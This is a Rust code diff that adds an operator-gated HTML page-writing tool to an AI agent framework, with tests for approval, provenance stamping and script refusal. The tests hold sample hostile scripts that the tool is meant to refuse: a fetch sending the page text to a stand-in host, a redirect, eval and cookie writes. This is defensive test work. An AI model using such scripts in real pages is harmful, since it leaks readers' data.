@@ -12,6 +12,7 @@
 
 use crate::tools::{denied, observe, str_arg, with_provenance_header, zone_of, ActionKind, Classified, Stamp, ToolCtx, ToolError, ToolExec, ToolResult, ToolSpec, ToolTier};
 use delphi_adapter::claude::ToolDef;
+use delphi_docs::htmlpage;
 use delphi_core::pathguard::{Access, Guard};
 use delphi_core::provenance::{gate_write, OutputCheck, Tier};
 use serde_json::{json, Value};
@@ -24,7 +25,7 @@ const OTHER_ROOTS: [&str; 6] = ["specs", "context", "memory", "skills", "agents"
 /// Mission folders tried, in order, for a plain path; the first one the role may write wins.
 const MISSION_FOLDERS: [&str; 7] = ["artifacts", "reports", "research", "specs", "comms", "councils", "threat-models"];
 
-const TOOLS: [&str; 1] = ["write_archive"];
+const TOOLS: &[&str] = &["write_archive", "write_html"];
 
 pub fn is_artifact_tool(name: &str) -> bool {
     TOOLS.contains(&name)
@@ -33,6 +34,7 @@ pub fn is_artifact_tool(name: &str) -> bool {
 fn extensions(tool: &str) -> &'static [&'static str] {
     match tool {
         "write_archive" => &["zip"],
+        "write_html" => &["html", "htm"],
         _ => &[],
     }
 }
@@ -102,6 +104,9 @@ fn members_of(args: &Value) -> Result<Vec<String>, ToolError> {
 
 /// What the call would do, from the arguments alone (`specs/014` §7.2): Green in the mission, Amber in a worktree.
 fn classify(tool: &str, args: &Value) -> Result<Classified, ToolError> {
+    if tool == "write_html" {
+        return classify_html(args);
+    }
     let path = str_arg(args, "path")?;
     let members = if tool == "write_archive" { Some(members_of(args)?) } else { None };
     let resolved = resolve_path(Some("missions/<mission>/artifacts"), path, tool).map_err(ToolError)?;
@@ -113,6 +118,28 @@ fn classify(tool: &str, args: &Value) -> Result<Classified, ToolError> {
         None => format!("write {}", path),
     };
     Ok(Classified { tool: tool.into(), tier, kind, summary, payload: json!({"tool": tool, "path": path, "members": members, "args_blake3": args_hash}), pattern: format!("{} {}/*", tool, dir) })
+}
+
+/// A page. Without a script it is Green in the mission (Amber in a worktree, as any worktree edit). With a free-form
+/// script it is **always** put to the operator, in full: it is classified so that no permission mode approves it
+/// (`SpecDraft` asks every time), and "allow similar" covers only this exact call. That review, with the page's
+/// content security policy, is the safety of a script; the linter only catches accidents.
+fn classify_html(args: &Value) -> Result<Classified, ToolError> {
+    let path = str_arg(args, "path")?;
+    let resolved = resolve_path(Some("missions/<mission>/artifacts"), path, "write_html").map_err(ToolError)?;
+    let spec = htmlpage::from_json(args).map_err(|e| ToolError(e.0))?;
+    // build it now, so a page that would fail its safety check is refused before anyone is asked
+    let html = htmlpage::render(&spec).map_err(|e| ToolError(e.0))?;
+    let args_hash = blake3::hash(serde_json::to_string(args).unwrap_or_default().as_bytes()).to_hex().to_string();
+    let dir = resolved.rsplit_once('/').map(|(d, _)| d).unwrap_or("");
+    let (tier, kind, pattern) = match &spec.script {
+        Some(_) => (ToolTier::Amber, ActionKind::SpecDraft, format!("write_html script {}", &args_hash[..16])),
+        None if resolved.starts_with("@worktree/") => (ToolTier::Amber, ActionKind::WorktreeEdit, format!("write_html {}/*", dir)),
+        None => (ToolTier::Green, ActionKind::MissionArtifact, format!("write_html {}/*", dir)),
+    };
+    let summary = format!("write {} (a page, {} block{}{})", path, spec.blocks.len(), if spec.blocks.len() == 1 { "" } else { "s" }, if spec.script.is_some() { ", WITH A SCRIPT to read before approving" } else { "" });
+    let payload = json!({"tool": "write_html", "path": path, "title": spec.title, "blocks": spec.blocks.len(), "script": spec.script, "bytes": html.len(), "page_blake3": blake3::hash(html.as_bytes()).to_hex().to_string(), "args_blake3": args_hash});
+    Ok(Classified { tool: "write_html".into(), tier, kind, summary, payload, pattern })
 }
 
 /// Where a call will write: the artifact and, if there is one, its provenance record.
@@ -137,6 +164,9 @@ pub fn precheck(guard: &Guard, ceiling: Tier, mission_id: &str, tool: &str, args
         for m in members_of(args).map_err(|e| ToolResult::err(e.0))? {
             guard.check_policy(&m, Access::Read).map_err(denied)?;
         }
+    }
+    if tool == "write_html" {
+        htmlpage::from_json(args).and_then(|s| htmlpage::render(&s)).map_err(|e| ToolResult::err(e.0))?;
     }
     Ok(Target { path: resolved, sidecar })
 }
@@ -230,6 +260,34 @@ fn write_archive(ctx: &mut ToolCtx, args: &Value) -> ToolResult {
     write_artifact(ctx, &target, &zip.finish(), "write_archive", &inputs)
 }
 
+fn write_html(ctx: &mut ToolCtx, args: &Value) -> ToolResult {
+    let target = match precheck(ctx.guard, ctx.span.ceiling(), ctx.mission_id, "write_html", args) {
+        Ok(t) => t,
+        Err(e) => return e,
+    };
+    let mut spec = match htmlpage::from_json(args) {
+        Ok(s) => s,
+        Err(e) => return ToolResult::err(e.0),
+    };
+    // the in-file provenance comment (the sidecar has the hash, which cannot be inside the file it describes)
+    let tier = ctx.span.output_tier(OutputCheck::Unverified);
+    spec.comment = Some(format!(
+        "delphi artifact: written by role {} in mission {} with write_html at {}; trust {} {}{}",
+        ctx.role,
+        ctx.mission_id,
+        ctx.now_rfc3339,
+        tier,
+        tier.name(),
+        target.sidecar.as_ref().map(|s| format!("; provenance record: {}", s.rsplit('/').next().unwrap_or(s))).unwrap_or_default()
+    ));
+    let html = match htmlpage::render(&spec) {
+        Ok(h) => h,
+        Err(e) => return ToolResult::err(e.0),
+    };
+    let inputs = vec![format!("title: {}", spec.title.chars().take(120).collect::<String>()), format!("blocks: {}", spec.blocks.len()), format!("free-form script: {}", if spec.script.is_some() { "yes (approved by the operator)" } else { "no" })];
+    write_artifact(ctx, &target, html.as_bytes(), "write_html", &inputs)
+}
+
 pub fn specs() -> Vec<ToolSpec> {
     vec![ToolSpec {
         def: ToolDef {
@@ -240,6 +298,23 @@ pub fn specs() -> Vec<ToolSpec> {
         requires_write_scope: true,
         classify: |tool, args| classify(tool, args),
         exec: ToolExec::Local(write_archive),
+    },
+    ToolSpec {
+        def: ToolDef {
+            name: "write_html".into(),
+            description: "Write a self-contained web page (one .html file) that opens in any browser with no network. Describe it as data and the tool writes the markup: `title`, then `blocks` (or `body_md` for a single markdown block). Block types: {type:\"markdown\", text} (headings, lists, tables, emphasis, code; raw HTML is shown as text; only #anchor links are clickable and other links print their address); {type:\"table\", columns:[…], rows:[[…]], caption?, sortable?, filter?} (up to 2000 rows × 40 columns; sortable and filter add click-to-sort and a search box); {type:\"tabs\", tabs:[{title, blocks:[…]}]}; {type:\"code\", text, copy?}; {type:\"callout\", kind:\"note\"|\"warning\"|\"tip\", text}; {type:\"stats\", items:[{label, value, delta?}]}. `theme` is auto, light or dark. Pages are responsive, follow the reader's light/dark setting and print cleanly. `path` is a plain name like `report.html` (goes in the mission's folder) or `@worktree/…`. Prefer no script: sorting, filtering, tabs and copy buttons are built in. An optional `script` (light DOM scripting only) is allowed but is shown to the operator in full and approved every time; it may not use the network, build code at run time, navigate, or rewrite markup, and the tool refuses it if it tries. A provenance record is written beside the page, and the page is as trusted as the least trusted input you read.".into(),
+            input_schema: json!({"type": "object", "required": ["path", "title"], "properties": {
+                "path": {"type": "string"},
+                "title": {"type": "string"},
+                "body_md": {"type": "string", "description": "markdown for a single block; use blocks for anything richer"},
+                "blocks": {"type": "array", "maxItems": 200, "items": {"type": "object", "required": ["type"], "properties": {"type": {"type": "string", "enum": ["markdown", "table", "tabs", "code", "callout", "stats"]}}}},
+                "theme": {"type": "string", "enum": ["auto", "light", "dark"]},
+                "script": {"type": "string", "description": "optional; shown to the operator in full and approved every time"}
+            }}),
+        },
+        requires_write_scope: true,
+        classify: |tool, args| classify(tool, args),
+        exec: ToolExec::Local(write_html),
     }]
 }
 
@@ -464,6 +539,134 @@ mod tests {
         assert!(events_of(&f, "approval.requested").is_empty() && events_of(&f, "provenance.stamp").is_empty());
         let told = f.model.requests()[1].body["messages"].to_string();
         assert!(told.contains("an artifact is written into the mission"), "{}", told);
+    }
+
+    fn run_tool(f: &mut Fx, tool: &str, args: Value) -> (ToolResult, Vec<Stamp>) {
+        let mut ctx = ToolCtx { guard: &f.guard, span: &mut f.span, index: &mut f.index, rules: &f.rules, probe: &AssumeClean, role: "architect", mission_id: "m1", now_rfc3339: "2026-10-25T12:00:00.000Z", stamps: vec![] };
+        let r = Registry::builtin().run(&mut ctx, tool, &args);
+        (r, std::mem::take(&mut ctx.stamps))
+    }
+
+    fn page_args() -> Value {
+        json!({"title": "Q3 review", "blocks": [
+            {"type": "markdown", "text": "# Summary\n\nRevenue **grew**."},
+            {"type": "table", "columns": ["Region", "Q3"], "rows": [["North", 120], ["South", 95]], "sortable": true, "filter": true},
+            {"type": "tabs", "tabs": [{"title": "Plan", "blocks": [{"type": "callout", "text": "Do it."}]}]}
+        ], "path": "report"})
+    }
+
+    #[test]
+    fn a_page_is_written_checked_stamped_and_marked_with_its_trust() {
+        let mut f = fx(&["missions/**"]);
+        let (r, stamps) = run_tool(&mut f, "write_html", page_args());
+        assert!(!r.is_error && r.content.starts_with("created missions/m1/artifacts/report.html (") && r.content.contains("tier L3"), "{}", r.content);
+        let html = fs::read_to_string(f.root.join("local/missions/m1/artifacts/report.html")).unwrap();
+        assert!(html.starts_with("<!doctype html>\n<!-- delphi artifact: written by role architect in mission m1 with write_html at 2026-10-25T12:00:00.000Z; trust L3 internal_generated; provenance record: report.html.provenance.md -->\n<html"), "{}", &html[..260]);
+        assert!(delphi_docs::htmllint::lint(&html).is_empty());
+        let side = fs::read_to_string(f.root.join("local/missions/m1/artifacts/report.html.provenance.md")).unwrap();
+        assert!(side.contains(&format!("artifact_blake3: {}", blake3::hash(html.as_bytes()).to_hex())) && side.contains("- title: Q3 review") && side.contains("- free-form script: no") && side.contains("produced_by: write_html"), "{}", side);
+        assert_eq!(stamps.len(), 2);
+        // it reads back through the same tools
+        let mut ctx = ToolCtx { guard: &f.guard, span: &mut f.span, index: &mut f.index, rules: &f.rules, probe: &AssumeClean, role: "architect", mission_id: "m1", now_rfc3339: "t", stamps: vec![] };
+        let back = Registry::builtin().run(&mut ctx, "read_doc", &json!({"path": "missions/m1/artifacts/report.html"}));
+        assert!(back.content.contains("# Q3 review") && back.content.contains("| North | 120 |"), "{}", back.content);
+    }
+
+    #[test]
+    fn a_page_written_after_reading_untrusted_input_says_so_in_the_file() {
+        let mut f = fx(&["missions/**"]);
+        f.span.observe_input(Tier::L0);
+        let (r, stamps) = run_tool(&mut f, "write_html", page_args());
+        assert!(!r.is_error && r.content.contains("tier L0 external_untrusted"), "{}", r.content);
+        let html = fs::read_to_string(f.root.join("local/missions/m1/artifacts/report.html")).unwrap();
+        assert!(html.contains("trust L0 external_untrusted"), "{}", &html[..260]);
+        assert!(stamps.iter().all(|s| s.tier == Tier::L0));
+    }
+
+    #[test]
+    fn a_scripted_page_is_never_auto_approved_and_an_unscripted_one_is_as_green_as_any_mission_artifact() {
+        let reg = Registry::builtin();
+        let plain = reg.classify("write_html", &page_args()).unwrap();
+        assert_eq!((plain.tier, plain.kind), (ToolTier::Green, ActionKind::MissionArtifact));
+        let mut wt = page_args();
+        wt["path"] = json!("@worktree/docs/report.html");
+        let w = reg.classify("write_html", &wt).unwrap();
+        assert_eq!((w.tier, w.kind), (ToolTier::Amber, ActionKind::WorktreeEdit));
+        let mut scripted = page_args();
+        scripted["script"] = json!("document.title = 'ready';");
+        let c = reg.classify("write_html", &scripted).unwrap();
+        assert_eq!((c.tier, c.kind), (ToolTier::Amber, ActionKind::SpecDraft), "no permission mode approves SpecDraft");
+        assert_eq!(c.payload["script"], "document.title = 'ready';", "the card shows the script in full");
+        assert!(c.summary.contains("WITH A SCRIPT") && c.pattern.starts_with("write_html script "), "{:?}", c);
+        // the same, in a worktree: still always asks
+        scripted["path"] = json!("@worktree/docs/report.html");
+        assert_eq!(reg.classify("write_html", &scripted).unwrap().kind, ActionKind::SpecDraft);
+        // "allow similar" is for this exact script only
+        let mut other = page_args();
+        other["script"] = json!("document.title = 'different';");
+        assert_ne!(c.pattern, reg.classify("write_html", &other).unwrap().pattern);
+    }
+
+    #[test]
+    fn a_page_that_would_fail_its_safety_check_is_refused_before_anyone_is_asked() {
+        let reg = Registry::builtin();
+        for (script, expect) in [("fetch('https://e.com/?' + document.body.textContent);", "fetch"), ("location = 'https://e.com';", "location"), ("var s = 'https://e.com';", "https:"), ("eval(x);", "eval")] {
+            let mut a = page_args();
+            a["script"] = json!(script);
+            let e = reg.classify("write_html", &a).unwrap_err();
+            assert!(e.0.contains("safety check") && e.0.contains(expect), "{}: {}", script, e);
+        }
+        for bad in [json!({"path": "r", "blocks": [{"type": "markdown", "text": "x"}]}), json!({"path": "r", "title": "T"}), json!({"path": "r", "title": "T", "blocks": [{"type": "video"}]}), json!({"path": "r.txt", "title": "T", "body_md": "x"}), json!({"path": "specs/r.html", "title": "T", "body_md": "x"})] {
+            assert!(reg.classify("write_html", &bad).is_err(), "{} was accepted", bad);
+        }
+        let mut f = fx(&["missions/**"]);
+        let mut a = page_args();
+        a["script"] = json!("document.cookie = 'x';");
+        let (r, stamps) = run_tool(&mut f, "write_html", a);
+        assert!(r.is_error && r.content.contains("cookie") && stamps.is_empty(), "{}", r.content);
+        assert!(!f.root.join("local/missions/m1/artifacts/report.html").exists());
+    }
+
+    async fn pending_card(f: &crate::testkit::Fx) -> Option<crate::approval::Request> {
+        for _ in 0..80 {
+            if let Some(c) = f.engine.broker.pending().into_iter().next() {
+                return Some(c);
+            }
+            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+        }
+        None
+    }
+
+    #[tokio::test]
+    async fn through_the_engine_even_the_most_permissive_mode_asks_about_a_script_and_a_denial_writes_nothing() {
+        use crate::approval::{Answer, Mode};
+        use crate::model::Step;
+        use crate::testkit::{events_of, setup};
+        let page = |script: Option<&str>| {
+            let mut a = json!({"path": "page.html", "title": "T", "body_md": "hello"});
+            if let Some(s) = script {
+                a["script"] = json!(s);
+            }
+            a
+        };
+        // a page without a script: Green, no card
+        let f = setup(vec![Step::tool("a1", "write_html", page(None)), Step::text("Done.")], 5.0, |_| {});
+        f.engine.broker.set_mode(Mode::MissionAuto);
+        f.engine.run_task(&f.m, "architect", "Make a page").await.unwrap();
+        assert!(events_of(&f, "approval.requested").is_empty());
+        assert!(f.root.join(format!("workspaces/w/local/missions/{}/research/page.html", f.m.id)).exists());
+        // a page with a script: a card in the most permissive mode, showing the script; denied, so nothing is written
+        let f = setup(vec![Step::tool("a1", "write_html", page(Some("document.title = 'x';"))), Step::text("Understood.")], 5.0, |_| {});
+        f.engine.broker.set_mode(Mode::Optimistic);
+        let (e, m) = (f.engine.clone(), f.m.clone());
+        let task = tokio::spawn(async move { e.run_task(&m, "architect", "Make a scripted page").await });
+        let c = pending_card(&f).await.expect("a scripted page always asks");
+        assert_eq!(c.tool, "write_html");
+        assert!(c.summary.contains("WITH A SCRIPT") && c.payload["script"] == "document.title = 'x';", "{:?}", c);
+        f.engine.broker.resolve(&c.approval_id, &c.payload_blake3, Answer::Deny { reason: "not today".into() }, "console-1").unwrap();
+        task.await.unwrap().unwrap();
+        assert!(!f.root.join(format!("workspaces/w/local/missions/{}/research/page.html", f.m.id)).exists());
+        assert!(f.model.requests()[1].body["messages"].to_string().contains("not today") || f.model.requests()[1].body["messages"].to_string().contains("denied"));
     }
 
     #[test]
